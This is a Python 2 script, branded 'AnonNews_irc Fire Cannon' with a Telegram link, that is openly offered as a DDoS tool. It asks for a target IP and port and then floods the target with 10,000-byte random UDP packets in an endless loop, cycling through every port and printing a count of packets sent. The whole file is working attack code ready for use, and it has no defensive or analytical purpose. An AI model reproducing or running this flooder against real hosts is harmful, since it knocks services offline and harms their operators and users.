#!/usr/bin

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Settings ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout =  time.time() 
############# Settings ##############

os.system ("clear")
print ('''
\033[91m
                                                  
  ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  ____ 
 ||A ||||n ||||o ||||n ||||N ||||e ||||w ||||s ||||_ ||||i ||||r ||||c ||
 ||__||||__||||__||||__||||__||||__||||__||||__||||__||||__||||__||||__||
 |/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\|

                          ____  ____  ____  ____ 
                         ||F ||||i ||||r ||||e ||
                         ||__||||__||||__||||__||
                         |/__\||/__\||/__\||/__\|
                     ____  ____  ____  ____  ____  ____ 
                    ||C ||||a ||||n ||||n ||||o ||||n ||
                    ||__||||__||||__||||__||||__||||__||
                    |/__\||/__\||/__\||/__\||/__\||/__\|
               
                            .#######..########.
                           .##.....##.##.....##
                           .##.....##.##.....##
                           .##.....##.########.
                           .##.....##.##.......
                           .##.....##.##.......
                          ..#######..##.......
             .####..######..########.....###....########.##......
             ..##..##....##.##.....##...##.##...##.......##......
             ..##..##.......##.....##..##...##..##.......##......
             ..##...######..########..##.....##.######...##......
             ..##........##.##...##...#########.##.......##......
             ..##..##....##.##....##..##.....##.##.......##......
             .####..######..##.....##.##.....##.########.########

                                    _..._   
                                  .'  |  `. 
                                 :    |    :
                                 :   /|\   :
                                 `. / | \ .'
                                   `-.:.-'  
                           \033[92m[\033[91mCoded By : AnonNews_irc\033[92m]
              \033[93m[\033[94mTelegram : https://t.me/addlist/iZfJw-LVfYthNzYx\033[93m]\033[95m
                               \033[93m[\033[94mAnonymous\033[93m]
''')
ip = raw_input("IP Target : ")
port = input("Port : ")

os.system("clear")
print "\033[91mStarting the DDos attack"
print "\033[91mLoading... 0% "
time.sleep(5)
print "\033[92mLoading... 25%"
time.sleep(5)
print "\033[92mLoading... 50%"
time.sleep(5)
print "\033[92mLoading... 75%"
time.sleep(5)
print "\033[92mFire"
time.sleep(3)
os.system ("clear")
sent = 0
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port)
     if port == 65534:
       port = 1
